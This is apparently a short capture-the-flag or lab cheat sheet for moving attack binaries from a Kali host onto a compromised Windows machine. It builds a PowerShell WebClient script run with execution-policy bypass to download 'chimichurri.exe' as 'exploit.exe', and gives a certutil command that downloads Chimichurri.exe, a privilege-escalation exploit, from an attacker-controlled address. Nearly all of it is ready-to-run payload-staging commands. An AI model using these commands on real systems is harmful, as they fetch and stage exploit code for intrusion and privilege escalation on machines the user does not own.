
## Download files from Kali machine to Windows using cmd & powershell

Failed to migrate powershell from cmd. \
In that case, to download binaries from Kali to Windows, use following commands.\

```
C:\ColdFusion8> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\ColdFusion8> echo $url = "http://10.10.14.10/chimichurri.exe" >>wget.ps1
C:\ColdFusion8> echo $file = "exploit.exe" >>wget.ps1
C:\ColdFusion8> echo $webclient.DownloadFile($url,$file) >>wget.ps1
C:\ColdFusion8> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile 
```


## Download files from Kali machine to Windows using certutil command

```
certutil.exe -urlcache -split -f http://10.10.14.19:8989/Chimichurri.exe Chimichurri.exe
```



